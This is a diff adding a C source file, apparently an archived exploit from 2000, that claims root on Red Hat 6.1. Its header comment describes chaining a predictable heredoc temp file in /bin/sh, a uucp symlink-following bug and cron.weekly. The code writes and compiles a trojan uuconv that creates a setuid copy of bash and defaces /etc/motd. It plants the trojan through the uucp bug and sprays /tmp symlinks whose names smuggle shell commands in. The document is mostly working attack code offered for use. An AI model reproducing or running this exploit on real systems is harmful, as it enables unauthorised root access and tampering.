@@ -1,0 +1,98 @@
+/**************************************************************
+
+root exploit: multiple subsystem errors allowing root exploit
+
+bashack.c - Thu Nov 30 21:50:50 NZDT 2000 (redhat 6.1)
+
+ /etc/rc.d/ and scripts that are trusting the untrustworthy.
+ /bin/sh acts silly when u get it to use the << redirection.
+ it creates a mode 666 file with an easily predictable name,
+ containing the pid as the only variant. As the same sequence
+ of events happens at most start ups, the pid of the line in
+ /etc/rc.d/rc.sysinit that creates the /boot/kernel.h file 
+ which uses << can be exploited. With another bit of bad
+ it will take until the next run of cron.weekly till you
+ have root. I'm sure someone can come up with a faster way.
+ (hint: lotsa stuff run as root have /sbin and /usr/sbin  
+ in their paths. / is a pain when backticking, making it
+ hard to tell the program what to run... FNAME below is
+ a method of getting around that, but its ugly as sin ;])
+
+
+[root@continuity /root]# rpm -qf /usr/bin/uucp
+uucp-1.06.1-20
+[root@continuity /root]# rpm -qf /etc/rc.d/rc3.d
+chkconfig-1.0.7-2
+initscripts-4.48-1
+[root@continuity /root]# rpm -qf /bin/bash
+bash-1.14.7-16
+[root@continuity /root]# rpm -qf /etc/cron.weekly/makewhatis.cron
+man-1.5g-6
+
+The big bug is like the tcsh one someone mentioned a while ago.
+
+*****************************************************************/
+#include <stdlib.h>
+#include <stdio.h>
+#define FNAME "/usr/man/man1/last.1.gz;export PATH=.;cd ..;cd ..;cd ..;cd ..;cd usr;cd sbin;uuconv;.1.gz"
+
+main()
+{
+ int d;
+  char fn[2000];
+  char *homedir;
+  FILE *file;
+  printf("bashack - root using multiple config/input validation errors\n\n");
+  printf("creating trojan in /usr/sbin/uuconv\n");
+  printf("                 - uucp bug -\n");
+  printf("uucp follows symlinks as euid=uucp, (uid,gid,egid=you)\n\n");
+  homedir=getenv("HOME");
+  sprintf(fn,"%s/bashacker/",homedir);
+  mkdir(fn);
+  chdir(fn);
+  sprintf(fn,"%s/bashacker/bashaker",homedir);
+  unlink(fn);
+  printf("== uuconv replacement\n");
+  printf("* making uuconv.c\n");
+  sprintf(fn,"%s/bashacker/uuconv.c",homedir);
+  file=fopen(fn,"w");
+  sprintf(fn,"%s/bashacker",homedir);
+  fprintf(file,"main()\n{\n");
+  fprintf(file,"printf(\"sendmail\n\");\n");
+  fprintf(file,"system(\"/bin/cp /bin/bash %s/bashacker;",fn);
+  fprintf(file,"/bin/chmod 6711 %s/bashacker;",fn);
+  fprintf(file,"echo hacked by %s>>/etc/motd;",getenv("LOGNAME"));
+  fprintf(file,"echo -n \\\"at about \\\" >>/etc/motd; /bin/date >>/etc/motd");
+  fprintf(file,"\");\n");
+  fprintf(file,"}\n");
+  fclose(file);
+  printf("* compiling ./uuconv.c ==> ./uuconv \n");
+  system("cc -o uuconv uuconv.c -O2;strip uuconv");
+  unlink("/var/spool/uucppublic/uuconv"); 
+  symlink("/usr/sbin/uuconv","/var/spool/uucppublic/uuconv");
+  printf("* copying to /usr/sbin via uucp bug\n");
+  sprintf(fn,
+  "/usr/bin/uucp %s/bashacker/uuconv /var/spool/uucppublic/uuconv",homedir);
+  system(fn);
+  printf("== cleaning up a little.\n");
+  unlink("/var/spool/uucppublic/uuconv");
+  unlink("uuconv");
+  unlink("uuconv.c");
+  printf("== set up /tmp for bash part of exploit.\n");
+  for(d=100;d<150;d++)
+  /*
+   on my machine its something like 118-120 or something, but it does
+   depend on what was running, or what files existed and stuff.
+   so please excuse the shotgun approach.
+  */
+  {
+  sprintf(fn,"/tmp/t%d-sh",d);
+  unlink(fn);
+  symlink(FNAME,fn);
+  } 
+  printf("* my work here is done.\n\n");
+  printf("now pray for some kinda of crash.\n\n\t--zen\n");
+}
+
+
+// milw0rm.com [2000-12-04]
